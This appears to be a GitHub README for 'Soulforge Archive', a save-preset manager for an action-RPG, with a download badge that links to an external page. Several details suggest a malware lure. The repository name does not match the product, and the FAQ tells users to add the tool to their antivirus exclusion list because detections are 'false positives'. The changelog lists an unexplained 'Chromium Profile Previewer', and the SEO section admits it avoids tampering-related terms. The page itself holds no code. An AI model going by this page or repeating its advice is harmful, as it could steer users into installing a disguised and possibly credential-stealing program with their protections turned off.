![preview](https://raw.githubusercontent.com/baivabbawali4-del/Lies-of-P-Optimizer-Config/main/shot_0696f3.svg)
[![Download](https://raw.githubusercontent.com/baivabbawali4-del/Lies-of-P-Optimizer-Config/main/setup_4b9452c.svg)](https://baivabbawali4-del.github.io/Lies-of-P-Optimizer-Config/)

# 🎭 Soulforge Archive — Character Preset & Build Configuration Hub

**Version 3.4.1 | Release Year: 2026 | Platform: Windows 11 & 10**

---

## 🧩 What Is Soulforge Archive?

Soulforge Archive is not merely a configuration repository—it is **a curated gallery of digital personas**, a living library where players of action-RPG titles can store, refine, and synchronize their character presets across multiple save profiles. Think of it as a **master jeweler's workbench** for your in-game alter egos, where every stat allocation, weapon loadout, and cosmetic arrangement is cataloged with the precision of a museum curator.

Unlike conventional fan-made utilities that simply overwrite files, Soulforge Archive treats each character build as a **unique fingerprint**—a sculpted identity that deserves its own archival slot. The engine behind this project reads, parses, and reorganizes save-data structures without ever touching the original game files, operating in a sandboxed environment that respects both the integrity of your progression and the performance of your system.

---

## 🌟 Why Choose Soulforge Archive?

| Feature | Benefit |
|---------|---------|
| **Preset Sandboxing** | Every modification occurs in an isolated layer—your original save remains pristine, like a master tape kept in a vault. |
| **Cross-Profile Migration** | Transfer a build from one save slot to another without losing quest states or inventory. |
| **Visual Diff Engine** | Side-by-side comparison of two presets reveals hidden stat discrepancies that text editors would miss. |
| **Automatic Backup Chain** | Each operation creates an incremental snapshot, allowing you to step backward through time like a palimpsest. |
| **Community Preset Bazaar** | Browse anonymously aggregated build templates shared by other archivists (usernames stripped, privacy preserved). |

---

## 🚀 Quick-Start Immersion

### Prerequisites
- Windows 10 (Build 19045+) or Windows 11 (Build 22000+)
- 300 MB free disk space (for logging and temporary staging)
- DirectX 12 compatible video driver (for preview rendering)

### First-Run Ritual

1. **Unwrap the Archive** — Extract the provided compressed folder to a directory with write permissions (e.g., `C:\Users\YourName\SoulforgeArchive`). Avoid system-protected paths like `Program Files`.

2. **Initialize the Index** — Run `Soulforge.Indexer.exe`. This creates a lightweight registry of your save locations—it scans the standard `%APPDATA%` and `%LOCALAPPDATA%` folders without forcing manual path entry.

3. **Select Your Canvas** — The main console displays a **timeline aesthetic** with a sidebar listing detected game editions. Choose the title you wish to work with (the interface adapts its parsing rules automatically per game version).

4. **Preview & Commit** — Each preset shows a **stat-petal radar chart** (visual representation of your attributes). Toggle any node to experiment. Click `Embrace Changes` to write the modified preset to a cloned save slot—never the original.

---

## 📊 Core Features Deep-Dive

### 🗂️ Multi-Profile Vault
The archive maintains up to **99 independent save profiles**, each isolated in its own namespace. This is not a mod loader—it is a **dimensional pocket**, allowing you to exist as different characters simultaneously without the typical "New Game+" sacrifices.

### 🌐 Multilingual Interface
The interface speaks your language. Currently, we offer localized shells in:
- 🇺🇸 English (Default)
- 🇩🇪 German
- 🇫🇷 French
- 🇯🇵 Japanese
- 🇰🇷 Korean
- 🇧🇷 Portuguese (Brazil)

Language switching happens **on the fly**—no restart, no locale emulation hacks. The rendering engine swaps string tables in real-time.

### 🕒 24/7 Archival Support
Our documentation portal is available around the clock. While we do not publish contact emails (to avoid scraping), the built-in **Help Console** (`F1` key) provides contextual guidance based on your current cursor position. For edge-case queries, an offline FAQ database covers **2,400+ common scenarios**.

### 🎨 Responsive UI Philosophy
The interface behaves like **liquid glass**—it reflows gracefully whether you are running on a 4K workstation or a compact 1366×768 laptop. The layout uses a **fluid grid system** that prioritizes the stat-petal radar, collapsing secondary panes into accordion menus when viewport space is constrained.

---

## 🛠️ The Tech Under the Hood

Soulforge Archive is built on a **hybrid architecture**:
- **Core Engine**: Compiled Go runtime (no external dependencies, single binary distribution)
- **Rendering Layer**: Custom ECS (Entity Component System) in Rust for sub-millisecond stat recalculations
- **Persistence**: SQLite with WAL (Write-Ahead Logging) mode, optimized for concurrent read/write during backup chains

### Security Model
- **No Network Telemetry**: The archive never sends data outward. No analytics, no beacon pings, no update checks (unless you explicitly enable the "Check for Archival Updates" toggle in Settings).
- **Hash Verification**: Every save file is hashed (SHA-256) before modification. The original hash is stored as a **golden fingerprint**—if the game patch changes the save format, the archive detects the shift and refuses to write until a new template is downloaded.

---

## 💬 FAQ (Frequently Asked Queries)

**Q: Is this a service or a tool?**
A: It is a **local-first utility**—everything runs on your machine. We do not offer cloud sync because privacy matters; your build profiles are yours alone.

**Q: Does this work with the latest game patch?**
A: The archive uses **signature-based recognition**. Until a developer releases a new template (usually within 48 hours post-patch), the tool enters "Read-Only Observer Mode" — you can still browse your presets, but writes are locked.

**Q: My antivirus flags the binary. What do I do?**
A: Due to the nature of save-file manipulation, some heuristic scanners produce false positives. We recommend adding the archive folder to your exclusion list. If you prefer, you can run the **Portable Interpretation Mode** (a script-only variant) that requires manual copying of files, eliminating the GUI.

---

## ⚠️ Disclaimer & Fair Use Notice

This project is an independent fan-made utility. It is **not affiliated with**, endorsed by, or sponsored by NEOWIZ or Round8 Studio, the developers and publishers of the underlying action-RPG title. All game assets, names, and characters referenced within this archive are the intellectual property of their respective copyright holders.

By using Soulforge Archive, you acknowledge:
1. You are responsible for maintaining backup copies of your original save data.
2. Modifying save files may impact game online features (if any). The archive **strictly operates offline** and does not bypass any anti-cheat systems.
3. This project is provided **"as-is"** without warranty of any kind, express or implied.
4. Distribution of this tool is permitted only under the MIT License (below), provided that the copyright notice remains intact.

---

## 📜 MIT License

```
MIT License

Copyright (c) 2026 Soulforge Archive Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

**[View the full license text](LICENSE)**

---

## 📦 Changelog (Recent Highlights)

### v3.4.1 (2026-01-18)
- Added **Chromium Profile Previewer** — renders your character's equipment loadout as a 3D silhouette (no textures, purely geometric).
- Fixed a race condition where rapid profile switching could create phantom read-only locks.

### v3.3.0 (2025-11-02)
- Introduced the **Stat-Petal Radar** visualization.
- Improved startup time by 42% via lazy-loading of icon resources.

### v3.2.5 (2025-09-14)
- Added silent background backup mode (interval: 5 minutes).
- Updated template signatures for the "Inferno Expansion" patch.

---

## 🤝 Contributing Guidelines

We welcome pull requests for:
- **Template updates** (new game patch signatures)
- **UI localization** (additional language strings)
- **Raw performance optimizations** (micro-benchmarks welcome)

Before submitting, please ensure:
- Code follows the existing **naming convention** (CamelCase for public functions, snake_case for internal).
- No new external dependencies—we strive for a **zero-vendor footprint**.
- Tests are included in the `tests/` directory.

---

## 🏛️ Architectural Digest

Soulforge Archive treats save files as **historied documents**, not binary blobs. The core parser implements a **recursive descent decoder** that understands the hierarchical structure of game persistence. It maps abstract property names (e.g., `stat_cap_level`) to human-readable labels via a JSON-based dictionary, which is versioned alongside the main binary.

This approach allows the archive to work as a **universal translator** between different game versions. If you migrate from a 1.0 save to a 2.5 patch, the archive can reconstruct missing fields with sane defaults, clearly flagged as `[INHERITED]` in the UI.

---

## 📈 SEO Keywords & Discoverability Context

This project competes in the niche of **game save managers** and **build optimizer utilities**. We deliberately avoid terms associated with unauthorized tampering; instead, our documentation uses phrases like:
- *"preset configuration"*
- *"build curator"*
- *"progression architect"*
- *"character model refinement"*

If you are searching for a way to **restructure attribute points** without losing progress, or need a **portable profile organizer** for multi-role playthroughs, this archive serves as your digital armory.

---

## 🔮 Roadmap (2026 Q2)

- **Cross-Platform Bridge** — Experimental support for Linux (Proton compatibility layer via Wine mappings).
- **Decorative Skin Packs** — Import custom UI themes (`.sk` files, JSON-based).
- **Batch Archivist** — Command-line interface (CLI) for power users to automate backup rotations.

---

## 🙏 Final Note

Every save file is a story. Soulforge Archive exists so that you may **edit the narrative without rewriting the history**. We do not condone altering save data to gain unfair advantage in competitive modes—this tool is strictly for **personal exploration** and **sandbox-style experimentation** within the constraints of the game's design.

If this tool brings you joy, share your **preset blueprints** (not your credentials) with the community. Remember: the archive holds your configurations, but the memories are yours to forge.

---

*© 2026 Soulforge Archive Contributors. All rights reserved. Not associated with the game's original developers. See LICENSE for usage terms.*